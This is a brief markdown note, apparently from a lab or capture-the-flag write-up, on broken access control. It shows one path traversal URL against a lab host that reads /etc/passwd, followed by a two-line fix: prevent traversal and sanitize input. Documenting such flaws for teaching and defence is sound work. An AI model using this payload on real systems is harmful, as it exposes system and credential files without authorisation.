# [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

## Exploit

http://10.0.2.5/index.php?page=../../../../../../../etc/passwd

## Solution

- Prevent Path traversal
- Sanitize user input
